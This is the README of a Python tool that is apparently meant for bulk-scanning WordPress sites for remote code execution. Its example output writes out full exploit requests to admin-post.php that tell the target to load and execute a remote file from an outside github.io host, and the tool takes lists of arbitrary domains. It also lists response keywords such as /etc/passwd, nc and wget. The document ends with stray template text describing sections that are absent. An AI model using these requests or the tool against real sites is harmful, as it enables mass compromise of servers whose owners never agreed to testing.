# WordPress RCE Vulnerability Scanner


A powerful tool designed to scan WordPress websites for Remote Code Execution (RCE) vulnerabilities. It uses various payloads to test for potential weaknesses and sensitive information exposure, providing immediate feedback on whether a site is vulnerable.

## Features

- 🚀 **Fast and Concurrent Scanning**: Leveraging the power of multithreading for quick domain scans.
- 🕵️‍♂️ **Sensitive Keyword Detection**: Scans for potentially dangerous information like `root`, `sudo`, `bin`, and `/etc/passwd`.
- ✅ **Real-Time Results**: See the results of your scan instantly as vulnerabilities are discovered.
- 📄 **Output to File**: Save your results to a file for later analysis.
- 🧩 **Easy to Use**: Simple command-line interface for both individual URLs and bulk domain scanning.

## How It Works

The tool scans WordPress websites by testing a variety of potential Remote Code Execution (RCE) vulnerabilities using predefined payloads. It checks for sensitive keywords in the response text to identify possible exploits.

### The scanner works in three steps:
1. **Payload Testing**: The scanner injects test payloads into WordPress URLs.
2. **Vulnerability Detection**: It checks if the response contains critical information like `root`, `sudo`, or `bin`.
3. **Instant Feedback**: As soon as a vulnerability is detected, the result is printed in real-time.

## Installation

### Prerequisites

Before you begin, ensure you have the following installed:
- Python 3.6 or higher
- pip (Python package installer)

### Install via pip

Clone this repository or download the script, and install the dependencies using the following:

```bash
git clone https://github.com/shaheen101sec/WpRce.git
cd WpRce
pip install -r requirements.txt
```

Alternatively, you can install the required packages using `pip`:

```bash
pip install requests rich
```

## Usage

### Scan a Single Domain

To scan a single WordPress domain for RCE vulnerabilities, use the `-u` option:

```bash
python3 tool.py -u https://example.com
```

### Scan Multiple Domains from a File

You can scan multiple domains by providing a file containing the list of domains, one per line:

```bash
python3 tool.py -l domains.txt
```

### Save Results to a File

You can save the results of your scan to a file by specifying the `-o` option:

```bash
python3 tool.py -u https://example.com -o results.txt
```

### Full Command Example

Here is an example of scanning a list of domains and saving the results to a file:

```bash
python3 tool.py -l domains.txt -o scan_results.txt
```

### Command-Line Arguments

| Option       | Description                                           |
|--------------|-------------------------------------------------------|
| `-u URL`     | Specify a single domain to scan.                     |
| `-l FILE`    | Provide a file containing a list of domains to scan. |
| `-o FILE`    | Output the results to a file.                        |

## Example Output

Here’s an example of the output you can expect:

```
[green]VULNERABLE![/green] https://example.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.txt
[yellow]NOT VULNERABLE[/yellow]: https://example2.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.php
[red]FAILED[/red]: https://example3.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.html
```

## Sensitive Keywords Detected

The scanner searches for the following critical keywords:
- `root`
- `bin`
- `sudo`
- `/etc/passwd`
- `sh`, `bash`
- `nc`, `wget`

If any of these keywords are found in the server’s response, the tool flags the domain as potentially vulnerable.

## Contributing

We welcome contributions to improve this tool! Feel free to fork the repository, submit issues, or open pull requests with enhancements, bug fixes, or documentation improvements.

### Explanation of Sections:

1. **Title and Logo**: A brief, clear title with a logo (optional if you add one).
2. **Features**: A list of key features of your tool.
3. **How It Works**: A short explanation of the tool’s functionality.
4. **Installation**: Instructions to set up and install the tool.
5. **Usage**: Detailed usage examples, including how to scan a single domain or a list of domains.
6. **Command-Line Arguments**: A table summarizing the available arguments.
7. **Example Output**: A sample of what the user will see after running the scan.
8. **Sensitive Keywords**: Describes what keywords the scanner looks for in responses.
9. **Contributing**: Instructions on how others can contribute to the project.
10. **License**: Legal info about the licensing of the project.
11. **Contact**: Information on how to contact you for support or feedback.
